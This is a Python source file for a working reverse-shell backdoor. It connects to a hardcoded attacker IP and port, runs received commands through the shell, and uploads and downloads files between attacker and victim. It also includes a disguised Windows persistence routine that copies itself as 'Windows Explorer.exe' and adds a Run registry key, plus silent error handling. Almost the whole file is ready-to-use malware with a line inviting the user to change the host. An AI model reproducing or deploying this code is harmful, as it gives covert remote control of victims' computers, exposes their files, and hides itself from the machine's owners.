#!/usr/bin/python3

import base64
import socket
import subprocess
import json
import os
import shutil
import sys
import struct

class Backdoor:
    def __init__(self, ip, port):
        #d_ip = self.decode(ip)
        #d_port = self.decode(port)
        # If you want to test the programm in persistent mode, I recommend you do it in a VM
        #self.becomePersistent()
        self.BUFFER_SIZE = 4096
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    # Create the file in a hard-to-find path and runs it every time the computer is turned on
    # In this case the given path is a Windows path. If you want to run it in Linux or Mac OS,
    # set the corresponding hard-to-find path to its OS
    def becomePersistent(self):
        fileLocation = os.environ['appdata'] + '\\Windows Explorer.exe'
        if not os.path.exists(fileLocation):
            shutil.copyfile(sys.executable, fileLocation)
            subprocess.call('reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + fileLocation + '"', shell=True)
    
    def decode(self, string):
        return base64.b64decode(string.encode()).decode()
    
    # Data is sent and recived in json format:
    # json encode to send
    def reliableSend(self, data):
        if isinstance(data, bytes):
            jsonData = json.dumps(data.decode('utf-8', 'replace'))            
        else:
            jsonData = json.dumps(data)

        self.connection.sendall(bytes(jsonData, 'utf-8'))

    # json Decode
    def reliableRecieve(self):
        jsonData = ''
        while True:
            # With a bucle, we make sure that all data is recived
            '''try:
                jsonData = self.connection.recv(4096)                
                return json.loads(jsonData.decode('utf-8'))
            
            except ValueError: 
                print('ERROR')
                continue'''
            jsonData = self.connection.recv(4096)                
            return json.loads(jsonData)
    
    def runCommand(self, command):
        try:
            return subprocess.check_output(command, shell=True)
            
        except subprocess.CalledProcessError:
            return '[-]Unrecognized command or error'

    def changeDirectory(self, path):
        try:
            os.chdir(path)
            return f'[+]Changing to {path}'

        except (FileNotFoundError, OSError): 
            return '[-]System can not find the path specified'
    
    
    def receive_file_size(self, sck: socket.socket):
        # This function makes sure all bytes are recived which indicates the size
        # of the file will be sent, that is codified by client way struct.pack()
        fmt = "<Q"
        expected_bytes = struct.calcsize(fmt)
        received_bytes = 0
        stream = bytes()
        while received_bytes < expected_bytes:
            chunk = sck.recv(expected_bytes - received_bytes)
            stream += chunk
            received_bytes += len(chunk)
        filesize = struct.unpack(fmt, stream)[0]
        return filesize

    def receive_file(self, sck: socket.socket, filename, route):
        # First, this reads the file size to recieve and then open a new file when
        # the recieved data will be saved
        filesize = self.receive_file_size(sck)
        filename = os.path.basename(filename)
        with open(f'{route}{filename}', "wb") as f:
            mensaje = '[+]Success download'
            received_bytes = 0
            # Revieces file in packs of 1024 bytes to complete the total bytes
            # amount
            while received_bytes < filesize:
                chunk = sck.recv(1024)
                # If socket contains an 'no encononontrado' message in the
                # recieved packet(xd), that means than file to recieve was not
                # found and it will print an error message

                if chunk and not (b'no encononontrado' in chunk):                    
                    f.write(chunk)
                    received_bytes += len(chunk)
                else:
                    mensaje = '[-]Error in download'
                    break
        return mensaje
    
    def send_file(self, sck: socket.socket, filename):
        try:
            # Tell to the socket the size file to send
            filesize = os.path.getsize(filename)
            sck.sendall(struct.pack("<Q", filesize))
            # Send the file in packs of 1024 bytes
            with open(filename, "rb") as f:
                while read_bytes := f.read(1024):
                    sck.sendall(read_bytes)
        except FileNotFoundError:
            sck.sendall(b'[-]File not found')
    
    def run(self):
        try:
            while True:
                # Read the command and depending on the recieved flag, it makes
                # an action or other
                command = self.reliableRecieve()
                if command[0] == 'salir':
                    self.connection.close()
                    exit()

                elif command[0] == 'cd' and len(command) > 1:
                    commandResults = self.changeDirectory(' '.join(command[1:]))

                elif command[0] == 'down':
                    commandResults = self.send_file(self.connection, ' '.join(command[2:]))

                elif command[0] == 'up':
                    filename = os.path.basename(' '.join(command[2:]))
                    commandResults = self.receive_file(self.connection, filename, command[1])

                else: 
                    commandResults = self.runCommand(command)
                    
                self.reliableSend(commandResults)

        except KeyboardInterrupt:
            self.reliableSend(b'Connection finished')
            self.connection.close()
            print('\nConnection finished')

try: 
    backdoor = Backdoor('192.168.1.14', 4444) # CHANGE HOST AND PORT HERE!
    backdoor.run()
except:
    sys.exit()
